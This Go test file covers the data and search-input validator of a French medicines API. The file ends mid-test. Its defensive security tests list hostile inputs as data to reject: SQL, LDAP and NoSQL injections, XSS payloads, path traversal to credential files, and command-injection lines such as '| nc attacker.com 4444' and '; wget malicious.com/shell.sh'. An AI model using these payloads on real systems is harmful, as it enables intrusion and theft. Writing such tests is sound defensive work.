package validation

import (
	"fmt"
	"slices"
	"strings"
	"testing"

	"github.com/giygas/medicaments-api/medicamentsparser/entities"
)

func TestNewDataValidator(t *testing.T) {
	validator := NewDataValidator()

	if validator == nil {
		t.Fatal("NewDataValidator returned nil")
	}

	// Type assertion to verify it's the correct type
	if _, ok := validator.(*DataValidatorImpl); !ok {
		t.Error("NewDataValidator should return *DataValidatorImpl")
	}
}

func TestValidateMedicament_Valid(t *testing.T) {
	validator := NewDataValidator()

	medicament := &entities.Medicament{
		Cis:                 123456,
		Denomination:        "Test Medicament",
		FormePharmaceutique: "Comprimé",
		VoiesAdministration: []string{"Orale"},
		StatusAutorisation:  "Autorisé",
	}

	err := validator.ValidateMedicament(medicament)
	if err != nil {
		t.Errorf("Expected no error for valid medicament, got: %v", err)
	}
}

func TestValidateMedicament_Nil(t *testing.T) {
	validator := NewDataValidator()

	err := validator.ValidateMedicament(nil)
	if err == nil {
		t.Error("Expected error for nil medicament")
	}

	expectedError := "medicament is nil"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateMedicament_InvalidCIS(t *testing.T) {
	validator := NewDataValidator()

	testCases := []struct {
		name string
		cis  int
	}{
		{"Zero CIS", 0},
		{"Negative CIS", -1},
		{"Negative large CIS", -123456},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			medicament := &entities.Medicament{
				Cis:                 tc.cis,
				Denomination:        "Test Medicament",
				FormePharmaceutique: "Comprimé",
				VoiesAdministration: []string{"Orale"},
				StatusAutorisation:  "Autorisé",
			}

			err := validator.ValidateMedicament(medicament)
			if err == nil {
				t.Errorf("Expected error for invalid CIS %d", tc.cis)
			}

			expectedError := fmt.Sprintf("invalid CIS code: %d", tc.cis)
			if err.Error() != expectedError {
				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
			}
		})
	}
}

func TestValidateMedicament_EmptyDenomination(t *testing.T) {
	validator := NewDataValidator()

	testCases := []struct {
		name         string
		denomination string
	}{
		{"Empty string", ""},
		{"Spaces only", "   "},
		{"Tab and spaces", "\t  \t  "},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			medicament := &entities.Medicament{
				Cis:                 123456,
				Denomination:        tc.denomination,
				FormePharmaceutique: "Comprimé",
				VoiesAdministration: []string{"Orale"},
				StatusAutorisation:  "Autorisé",
			}

			err := validator.ValidateMedicament(medicament)
			if err == nil {
				t.Errorf("Expected error for empty denomination")
			}

			expectedError := "empty denomination for CIS 123456"
			if err.Error() != expectedError {
				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
			}
		})
	}
}

func TestValidateMedicament_TooLongDenomination(t *testing.T) {
	validator := NewDataValidator()

	// Create a string longer than 200 characters
	longDenomination := ""
	for range 201 {
		longDenomination += "a"
	}

	medicament := &entities.Medicament{
		Cis:                 123456,
		Denomination:        longDenomination,
		FormePharmaceutique: "Comprimé",
		VoiesAdministration: []string{"Orale"},
		StatusAutorisation:  "Autorisé",
	}

	err := validator.ValidateMedicament(medicament)
	if err == nil {
		t.Error("Expected error for too long denomination")
	}

	expectedError := "denomination too long for CIS 123456: 201 characters"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateMedicament_TooLongFormePharmaceutique(t *testing.T) {
	validator := NewDataValidator()

	// Create a string longer than 100 characters
	longForme := ""
	for range 101 {
		longForme += "a"
	}

	medicament := &entities.Medicament{
		Cis:                 123456,
		Denomination:        "Test Medicament",
		FormePharmaceutique: longForme,
		VoiesAdministration: []string{"Orale"},
		StatusAutorisation:  "Autorisé",
	}

	err := validator.ValidateMedicament(medicament)
	if err == nil {
		t.Error("Expected error for too long forme pharmaceutique")
	}

	expectedError := "forme pharmaceutique too long for CIS 123456: 101 characters"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateMedicament_TooLongVoieAdministration(t *testing.T) {
	validator := NewDataValidator()

	// Create a string longer than 50 characters
	longVoie := ""
	for range 51 {
		longVoie += "a"
	}

	medicament := &entities.Medicament{
		Cis:                 123456,
		Denomination:        "Test Medicament",
		FormePharmaceutique: "Comprimé",
		VoiesAdministration: []string{"Orale", longVoie},
		StatusAutorisation:  "Autorisé",
	}

	err := validator.ValidateMedicament(medicament)
	if err == nil {
		t.Error("Expected error for too long voie d'administration")
	}

	expectedError := "voie d'administration too long for CIS 123456: 51 characters"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateMedicament_TooLongStatusAutorisation(t *testing.T) {
	validator := NewDataValidator()

	// Create a string longer than 50 characters
	longStatus := ""
	for range 51 {
		longStatus += "a"
	}

	medicament := &entities.Medicament{
		Cis:                 123456,
		Denomination:        "Test Medicament",
		FormePharmaceutique: "Comprimé",
		VoiesAdministration: []string{"Orale"},
		StatusAutorisation:  longStatus,
	}

	err := validator.ValidateMedicament(medicament)
	if err == nil {
		t.Error("Expected error for too long status autorisation")
	}

	expectedError := "status autorisation too long for CIS 123456: 51 characters"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

// TestCheckDuplicateCIP tests the duplicate CIP detection function
func TestCheckDuplicateCIP(t *testing.T) {
	fmt.Println("Testing checkDuplicateCIP function...")

	validator := NewDataValidator()

	testCases := []struct {
		name             string
		presentations    []entities.Presentation
		expectError      bool
		expectedCIP7Dup  int
		expectedCIP13Dup int
	}{
		{
			name: "No duplicates",
			presentations: []entities.Presentation{
				{Cis: 1, Cip7: 1234567, Cip13: 3400912345678},
				{Cis: 2, Cip7: 2345678, Cip13: 3400923456789},
				{Cis: 3, Cip7: 3456789, Cip13: 3400934567890},
			},
			expectError:      false,
			expectedCIP7Dup:  0,
			expectedCIP13Dup: 0,
		},
		{
			name: "Duplicate CIP7 values",
			presentations: []entities.Presentation{
				{Cis: 1, Cip7: 1234567, Cip13: 3400912345678},
				{Cis: 2, Cip7: 1234567, Cip13: 3400923456789}, // Duplicate CIP7
				{Cis: 3, Cip7: 3456789, Cip13: 3400934567890},
			},
			expectError:      true,
			expectedCIP7Dup:  1,
			expectedCIP13Dup: 0,
		},
		{
			name: "Duplicate CIP13 values",
			presentations: []entities.Presentation{
				{Cis: 1, Cip7: 1234567, Cip13: 3400912345678},
				{Cis: 2, Cip7: 2345678, Cip13: 3400912345678}, // Duplicate CIP13
				{Cis: 3, Cip7: 3456789, Cip13: 3400934567890},
			},
			expectError:      true,
			expectedCIP7Dup:  0,
			expectedCIP13Dup: 1,
		},
		{
			name: "Multiple duplicates of both types",
			presentations: []entities.Presentation{
				{Cis: 1, Cip7: 1234567, Cip13: 3400912345678},
				{Cis: 2, Cip7: 1234567, Cip13: 3400923456789}, // Duplicate CIP7
				{Cis: 3, Cip7: 2345678, Cip13: 3400923456789}, // Duplicate CIP13
				{Cis: 4, Cip7: 3456789, Cip13: 3400934567890},
				{Cis: 5, Cip7: 3456789, Cip13: 3400912345678}, // Duplicate both
			},
			expectError:      true,
			expectedCIP7Dup:  2,
			expectedCIP13Dup: 2,
		},
		{
			name:             "Empty slice",
			presentations:    []entities.Presentation{},
			expectError:      false,
			expectedCIP7Dup:  0,
			expectedCIP13Dup: 0,
		},
		{
			name: "Single presentation",
			presentations: []entities.Presentation{
				{Cis: 1, Cip7: 1234567, Cip13: 3400912345678},
			},
			expectError:      false,
			expectedCIP7Dup:  0,
			expectedCIP13Dup: 0,
		},
		{
			name: "Three duplicates of same CIP",
			presentations: []entities.Presentation{
				{Cis: 1, Cip7: 1234567, Cip13: 3400912345678},
				{Cis: 2, Cip7: 1234567, Cip13: 3400923456789},
				{Cis: 3, Cip7: 1234567, Cip13: 3400934567890}, // Third duplicate
			},
			expectError:      true,
			expectedCIP7Dup:  1,
			expectedCIP13Dup: 0,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := validator.CheckDuplicateCIP(tc.presentations)

			hasError := err != nil
			if hasError != tc.expectError {
				t.Errorf("Expected error: %v, got error: %v", tc.expectError, err)
			}

			if hasError && tc.expectedCIP7Dup > 0 {
				if !containsString(err.Error(), fmt.Sprintf("%d duplicate CIP7", tc.expectedCIP7Dup)) {
					t.Errorf("Expected error to mention %d duplicate CIP7, got: %v", tc.expectedCIP7Dup, err)
				}
			}

			if hasError && tc.expectedCIP13Dup > 0 {
				if !containsString(err.Error(), fmt.Sprintf("%d duplicate CIP13", tc.expectedCIP13Dup)) {
					t.Errorf("Expected error to mention %d duplicate CIP13, got: %v", tc.expectedCIP13Dup, err)
				}
			}

			// If no error expected and got one, fail the test
			if !tc.expectError && err != nil {
				t.Errorf("Expected no error, got: %v", err)
			}
		})
	}

	fmt.Println("checkDuplicateCIP tests completed")
}

// Helper function to check if a string contains a substring
func containsString(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > len(substr) && containsSubstring(s, substr))
}

func containsSubstring(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func TestValidateDataIntegrity_Valid(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 123456, Denomination: "Test 1"},
		{Cis: 789012, Denomination: "Test 2"},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID: 1,
			Libelle: "Test Generique",
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 123456, Denomination: "Test 1"},
			},
		},
	}

	err := validator.ValidateDataIntegrity(medicaments, generiques)
	if err != nil {
		t.Errorf("Expected no error for valid data, got: %v", err)
	}
}

func TestValidateDataIntegrity_NoMedicaments(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{}
	generiques := []entities.GeneriqueList{
		{GroupID: 1, Libelle: "Test Generique"},
	}

	err := validator.ValidateDataIntegrity(medicaments, generiques)
	if err == nil {
		t.Error("Expected error for no medicaments")
	}

	expectedError := "no medicaments found"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateDataIntegrity_NoGeneriques(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 123456, Denomination: "Test 1"},
	}
	generiques := []entities.GeneriqueList{}

	err := validator.ValidateDataIntegrity(medicaments, generiques)
	if err == nil {
		t.Error("Expected error for no generiques")
	}

	expectedError := "no generiques found"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateDataIntegrity_DuplicateCIS(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 123456, Denomination: "Test 1"},
		{Cis: 123456, Denomination: "Test 2"}, // Duplicate CIS
	}

	generiques := []entities.GeneriqueList{
		{GroupID: 1, Libelle: "Test Generique"},
	}

	err := validator.ValidateDataIntegrity(medicaments, generiques)
	if err == nil {
		t.Error("Expected error for duplicate CIS")
	}

	expectedError := "duplicate CIS code found: 123456"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateDataIntegrity_DuplicateGroupID(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 123456, Denomination: "Test 1"},
		{Cis: 789012, Denomination: "Test 2"},
	}

	generiques := []entities.GeneriqueList{
		{GroupID: 1, Libelle: "Test Generique 1"},
		{GroupID: 1, Libelle: "Test Generique 2"}, // Duplicate GroupID
	}

	err := validator.ValidateDataIntegrity(medicaments, generiques)
	if err == nil {
		t.Error("Expected error for duplicate group ID")
	}

	expectedError := "duplicate generique group ID found: 1"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateDataIntegrity_EmptyGeneriqueLibelle(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 123456, Denomination: "Test 1"},
	}

	generiques := []entities.GeneriqueList{
		{GroupID: 1, Libelle: "   "}, // Empty libelle
	}

	err := validator.ValidateDataIntegrity(medicaments, generiques)
	if err == nil {
		t.Error("Expected error for empty generique libelle")
	}

	expectedError := "empty libelle for generique group 1"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateDataIntegrity_TooLongGeneriqueLibelle(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 123456, Denomination: "Test 1"},
	}

	// Create a string longer than 200 characters
	longLibelle := ""
	for range 201 {
		longLibelle += "a"
	}

	generiques := []entities.GeneriqueList{
		{GroupID: 1, Libelle: longLibelle},
	}

	err := validator.ValidateDataIntegrity(medicaments, generiques)
	if err == nil {
		t.Error("Expected error for too long generique libelle")
	}

	expectedError := "libelle too long for generique group 1: 201 characters"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateDataIntegrity_MedicamentNotFoundInGenerique(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 123456, Denomination: "Test 1"},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID: 1,
			Libelle: "Test Generique",
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 999999, Denomination: "Not Found"}, // CIS not in medicaments list
			},
		},
	}

	err := validator.ValidateDataIntegrity(medicaments, generiques)
	if err == nil {
		t.Error("Expected error for medicament not found in generique")
	}

	expectedError := "medicament CIS 999999 in generique group 1 not found in medicaments list"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateInput_Valid(t *testing.T) {
	validator := NewDataValidator()

	validInputs := []string{
		"test",
		"Test Medicament",
		"paracetamol",
		"ibuprofene 200mg",
		"aspirine-500",
		"test'medicament",
		"dr. smith",
		"paracetamol+cafeine",
		"actonelcombi 35 mg + 1000 mg",
		"alunbrig 90 mg + 180 mg",
	}

	for _, input := range validInputs {
		t.Run(input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err != nil {
				t.Errorf("Expected no error for valid input '%s', got: %v", input, err)
			}
		})
	}
}

func TestValidateInput_Empty(t *testing.T) {
	validator := NewDataValidator()

	invalidInputs := []string{
		"",
		"   ",
		"\t",
		"\n",
		"  \t  \n  ",
	}

	for _, input := range invalidInputs {
		t.Run("empty_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for empty input")
			}

			expectedError := "input cannot be empty"
			if err.Error() != expectedError {
				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
			}
		})
	}
}

func TestValidateInput_TooShort(t *testing.T) {
	validator := NewDataValidator()

	shortInputs := []string{
		"a",
		"ab",
	}

	for _, input := range shortInputs {
		t.Run("short_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for short input '%s'", input)
			}

			expectedError := "input too short: minimum 3 characters"
			if err.Error() != expectedError {
				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
			}
		})
	}
}

func TestValidateInput_TooLong(t *testing.T) {
	validator := NewDataValidator()

	// Create a string longer than 50 characters
	longInput := ""
	for range 51 {
		longInput += "a"
	}

	err := validator.ValidateInput(longInput)
	if err == nil {
		t.Error("Expected error for too long input")
	}

	expectedError := "input too long: maximum 50 characters"
	if err.Error() != expectedError {
		t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
	}
}

func TestValidateInput_TooManyWords(t *testing.T) {
	validator := NewDataValidator()

	tests := []struct {
		name  string
		input string
	}{
		{"7 words", "paracetamol 500 mg tablet extra test more"},
		{"8 words", "ibuprofene arrow conseil 400 mg caps test extra"},
		{"9 words", "a b c d e f g h i"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateInput(tt.input)
			if err == nil {
				t.Error("Expected error for too many words")
			}

			expectedError := "search query too complex: maximum 6 words allowed"
			if err.Error() != expectedError {
				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
			}
		})
	}
}

func TestValidateInput_DangerousPatterns(t *testing.T) {
	validator := NewDataValidator()

	dangerousInputs := []string{
		"<script>alert('xss')</script>",
		"javascript:alert('xss')",
		"vbscript:msgbox('xss')",
		"onload=alert('xss')",
		"onerror=alert('xss')",
		"onclick=alert('xss')",
		"onmouseover=alert('xss')",
		"onfocus=alert('xss')",
		"onblur=alert('xss')",
		"onchange=alert('xss')",
		"onsubmit=alert('xss')",
		"eval('xss')",
		"expression('xss')",
		"url('javascript:xss')",
		"import 'malicious'",
		"@import 'malicious'",
		"binding('xss')",
		"behavior('xss')",
		"SCRIPT>alert('xss')</SCRIPT>", // Case insensitive test
	}

	for _, input := range dangerousInputs {
		t.Run("dangerous_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for dangerous input '%s'", input)
			}

			expectedError := "input contains potentially dangerous content"
			if err.Error() != expectedError {
				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
			}
		})
	}
}

func TestValidateInput_InvalidCharacters(t *testing.T) {
	validator := NewDataValidator()

	invalidInputs := []string{
		"test@medicament",
		"test#medicament",
		"test$medicament",
		"test%medicament",
		"test&medicament",
		"test*medicament",
		"test=medicament",
		"test|medicament",
		"test\\medicament",
		"test/medicament",
		"test<medicament>",
		"test[medicament]",
		"test{medicament}",
		"test(medicament)",
		"test^medicament",
		// Note: backtick (`) is caught by dangerous pattern check (command injection)
		"test~medicament",
		"test!medicament",
		"test?medicament",
		"test:medicament",
		"test;medicament",
		"test\"medicament\"",
	}

	for _, input := range invalidInputs {
		t.Run("invalid_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for invalid characters in input '%s'", input)
			}

			expectedError := "input contains invalid characters. Only letters, numbers, spaces, hyphens, apostrophes, periods, and plus sign are allowed"
			if err.Error() != expectedError {
				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
			}
		})
	}
}

func TestValidateInput_ExcessiveRepetition(t *testing.T) {
	validator := NewDataValidator()

	// Create strings with excessive repetition
	repetitiveInputs := []string{
		"aaaaaaaaaaa",        // 11 'a's
		"testttttttttttt",    // 12 't's
		"11111111111",        // 11 '1's
		"testaaaaaaaaaaaend", // 11 'a's in a row
	}

	for _, input := range repetitiveInputs {
		t.Run("repetitive_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for excessive repetition in input '%s'", input)
			}

			expectedError := "input contains excessive character repetition"
			if err.Error() != expectedError {
				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
			}
		})
	}
}

func TestValidateInput_AccentsRejected(t *testing.T) {
	validator := NewDataValidator()

	accentInputs := []string{
		"ibuprofène",
		"paracétamol",
		"caféine",
		"codéïne",
		"éphédrine",
		"àâäéèêëïîôöùûüÿç",
		"PARACÉTAMOL",
		"CAFÉINE",
	}

	for _, input := range accentInputs {
		t.Run(input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for accented input '%s'", input)
			}

			expectedError := "accents not supported. Try removing them"
			if !strings.Contains(err.Error(), expectedError) {
				t.Errorf("Expected error to contain '%s', got '%s'", expectedError, err.Error())
			}
		})
	}
}

func TestHasExcessiveRepetition(t *testing.T) {
	validator := &DataValidatorImpl{}

	// Test cases with excessive repetition (should return true)
	repetitiveInputs := []string{
		"aaaaaaaaaaa",        // 11 'a's
		"testttttttttttt",    // 12 't's
		"11111111111",        // 11 '1's
		"testaaaaaaaaaaaend", // 11 'a's in a row
		"bbbbbbbbbbb",        // 11 'b's
	}

	for _, input := range repetitiveInputs {
		t.Run("repetitive_"+input, func(t *testing.T) {
			result := validator.hasExcessiveRepetition(input)
			if !result {
				t.Errorf("Expected true for excessive repetition in input '%s'", input)
			}
		})
	}

	// Test cases without excessive repetition (should return false)
	normalInputs := []string{
		"test",
		"aaaaaaaaaa",      // 10 'a's (not excessive)
		"testtttttttt",    // 9 't's
		"1111111111",      // 10 '1's
		"testaaaaaaaaend", // 8 'a's in a row
		"normal text",
		"a-b-c-d-e-f-g",
	}

	for _, input := range normalInputs {
		t.Run("normal_"+input, func(t *testing.T) {
			result := validator.hasExcessiveRepetition(input)
			if result {
				t.Errorf("Expected false for normal input '%s'", input)
			}
		})
	}
}

func BenchmarkValidateMedicament(b *testing.B) {
	validator := NewDataValidator()

	medicament := &entities.Medicament{
		Cis:                 123456,
		Denomination:        "Test Medicament",
		FormePharmaceutique: "Comprimé",
		VoiesAdministration: []string{"Orale", "Injectable"},
		StatusAutorisation:  "Autorisé",
	}

	b.ResetTimer()
	for b.Loop() {
		if err := validator.ValidateMedicament(medicament); err != nil {
			b.Logf("Validation failed: %v", err)
		}
	}
}

func BenchmarkValidateInput(b *testing.B) {
	validator := NewDataValidator()

	input := "paracétamol 500mg"

	b.ResetTimer()
	for b.Loop() {
		if err := validator.ValidateInput(input); err != nil {
			b.Logf("Validation failed: %v", err)
		}
	}
}

func TestValidateInput_AdvancedSecurityPatterns(t *testing.T) {
	validator := NewDataValidator()

	// Test for SQL injection patterns
	sqlInjectionInputs := []string{
		"'; DROP TABLE medicaments; --",
		"' OR '1'='1",
		"' UNION SELECT * FROM users --",
		"1'; DELETE FROM medicaments WHERE 't'='t",
		"' OR 1=1 --",
		"' OR 'a'='a",
		"1' OR '1'='1' /*",
		"admin'--",
		"admin' /*",
		"' or 1=1#",
		"' or 1=1--",
		"' or 1=1/*",
		") or '1'='1--",
		") or (1=1--",
	}

	for _, input := range sqlInjectionInputs {
		t.Run("sql_injection_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for SQL injection pattern in input '%s'", input)
			}
		})
	}

	// Test for command injection patterns
	commandInjectionInputs := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"& echo 'hack'",
		"`whoami`",
		"$(id)",
		"; rm -rf /",
		"| nc attacker.com 4444",
		"&& curl malicious.com",
		"; wget malicious.com/shell.sh",
		"|| ping -c 10 127.0.0.1",
	}

	for _, input := range commandInjectionInputs {
		t.Run("command_injection_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for command injection pattern in input '%s'", input)
			}
		})
	}

	// Test for path traversal patterns
	pathTraversalInputs := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"file:///etc/passwd",
		"/etc/shadow",
		"C:\\windows\\system32\\config\\sam",
	}

	for _, input := range pathTraversalInputs {
		t.Run("path_traversal_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for path traversal pattern in input '%s'", input)
			}
		})
	}

	// Test for LDAP injection patterns
	ldapInjectionInputs := []string{
		"*)(&",
		"*)(|(objectClass=*)",
		"*)(|(cn=*))",
		"*))%00",
		"admin)(&(password=*))",
		"*)|(cn=*))",
	}

	for _, input := range ldapInjectionInputs {
		t.Run("ldap_injection_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for LDAP injection pattern in input '%s'", input)
			}
		})
	}

	// Test for NoSQL injection patterns
	nosqlInjectionInputs := []string{
		"{$ne: null}",
		"{$gt: \"\"}",
		"{$where: \"return true\"}",
		"{$or: [{\"\": \"\"}]}",
		"{$regex: \".*\"}",
		"{$expr: {$eq: [\"$field\", \"$field\"]}}",
	}

	for _, input := range nosqlInjectionInputs {
		t.Run("nosql_injection_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for NoSQL injection pattern in input '%s'", input)
			}
		})
	}
}

func TestValidateInput_XSSAdvancedPatterns(t *testing.T) {
	validator := NewDataValidator()

	// Test for advanced XSS patterns
	advancedXSSInputs := []string{
		"<img src=x onerror=alert('xss')>",
		"<svg onload=alert('xss')>",
		"<iframe src=javascript:alert('xss')>",
		"<body onload=alert('xss')>",
		"<input onfocus=alert('xss') autofocus>",
		"<select onfocus=alert('xss') autofocus>",
		"<textarea onfocus=alert('xss') autofocus>",
		"<keygen onfocus=alert('xss') autofocus>",
		"<video><source onerror=alert('xss')>",
		"<audio src=x onerror=alert('xss')>",
		"<details open ontoggle=alert('xss')>",
		"<marquee onstart=alert('xss')>",
		"<isindex action=javascript:alert('xss') type=submit>",
		"<form><button formaction=javascript:alert('xss')>",
		"<meta http-equiv=refresh content=0;url=javascript:alert('xss')>",
		"<link rel=import href=javascript:alert('xss')>",
	}

	for _, input := range advancedXSSInputs {
		t.Run("advanced_xss_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for advanced XSS pattern in input '%s'", input)
			}
		})
	}

	// Test for encoded XSS patterns
	encodedXSSInputs := []string{
		"%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
		"&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;",
		"&#60;script&#62;alert&#40;&#39;xss&#39;&#41;&#60;/script&#62;",
		"&#x3C;script&#x3E;alert&#x28;&#x27;xss&#x27;&#x29;&#x3C;/script&#x3E;",
	}

	for _, input := range encodedXSSInputs {
		t.Run("encoded_xss_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			// Note: These might not be caught by current validation since they're encoded
			// This test documents the current limitation
			if err != nil {
				t.Logf("Encoded XSS pattern caught (good): '%s'", input)
			} else {
				t.Logf("Encoded XSS pattern not caught (expected limitation): '%s'", input)
			}
		})
	}
}

func TestValidateInput_DoSProtection(t *testing.T) {
	validator := NewDataValidator()

	// Test for very long inputs that might cause DoS
	veryLongInputs := []string{
		string(make([]byte, 1000)),   // 1000 characters
		string(make([]byte, 10000)),  // 10000 characters
		string(make([]byte, 100000)), // 100000 characters
	}

	for i, input := range veryLongInputs {
		t.Run(fmt.Sprintf("very_long_input_%d", i), func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for very long input (%d characters)", len(input))
			}

			expectedError := "input too long: maximum 50 characters"
			if err.Error() != expectedError {
				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
			}
		})
	}

	// Test for inputs with many special characters that might cause regex DoS
	specialCharHeavyInputs := []string{
		"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!",
		"??????????????????????????????????????????????????",
		"%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%",
		"**************************************************",
		"++++++++++++++++++++++++++++++++++++++++++++++++++",
		"==================================================",
	}

	for _, input := range specialCharHeavyInputs {
		t.Run("special_char_heavy_"+input, func(t *testing.T) {
			err := validator.ValidateInput(input)
			if err == nil {
				t.Errorf("Expected error for special character heavy input '%s'", input)
			}
		})
	}
}

func TestValidateCIP_Valid(t *testing.T) {
	validator := NewDataValidator()

	validInputs := []string{
		"1234567",       // 7 chars - valid
		"1234567890123", // 13 chars - valid
		"0000001",       // 7 chars with leading zeros
		"1023456789012", // 13 chars realistic CIP format
		"9876543210987", // Another 13 chars realistic format
		"1230456789012", // 13 chars mixed with zero
		"1012345678901", // 13 chars realistic format without excessive repetition
	}

	for _, input := range validInputs {
		t.Run("valid_"+input, func(t *testing.T) {
			_, err := validator.ValidateCIP(input)
			if err != nil {
				t.Errorf("Expected no error for valid CIP '%s', got: %v", input, err)
			}
		})
	}
}

func TestValidateCIP_Empty(t *testing.T) {
	validator := NewDataValidator()

	invalidInputs := []string{
		"",
		"   ",
		"\t",
		"\n",
		"  \t  \n  ",
	}

	for _, input := range invalidInputs {
		t.Run("empty_"+input, func(t *testing.T) {
			_, err := validator.ValidateCIP(input)
			if err == nil {
				t.Errorf("Expected error for empty input")
			}

			expectedError := "input cannot be empty"
			if err.Error() != expectedError {
				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
			}
		})
	}
}

func TestValidateCIP_TooShort(t *testing.T) {
	validator := NewDataValidator()

	testCases := []struct {
		name  string
		input string
	}{
		{"6_chars", "123456"},        // Below minimum
		{"1_char", "1"},              // Single digit
		{"empty", ""},                // Empty string
		{"8_chars", "12345678"},      // Invalid length
		{"9_chars", "123456789"},     // Invalid length
		{"10_chars", "1234567890"},   // Invalid length
		{"11_chars", "12345678901"},  // Invalid length
		{"12_chars", "123456789012"}, // Invalid length
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := validator.ValidateCIP(tc.input)
			if err == nil {
				t.Errorf("Expected error for short CIP '%s'", tc.input)
			}

			expectedError := "input cannot be empty"
			if tc.input == "" {
				if err.Error() != expectedError {
					t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
				}
			} else {
				expectedError := "CIP should have 7 or 13 characters"
				if err.Error() != expectedError {
					t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
				}
			}
		})
	}
}

func TestValidateCIP_TooLong(t *testing.T) {
	validator := NewDataValidator()

	testCases := []struct {
		name  string
		input string
	}{
		{"14_chars", "12345678901234"},       // Above maximum
		{"15_chars", "123456789012345"},      // Above maximum
		{"20_chars", "99999999999999999999"}, // Well above maximum
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := validator.ValidateCIP(tc.input)
			if err == nil {
				t.Errorf("Expected error for long CIP '%s'", tc.input)
			}

			expectedError := "CIP should have 7 or 13 characters"
			if err.Error() != expectedError {
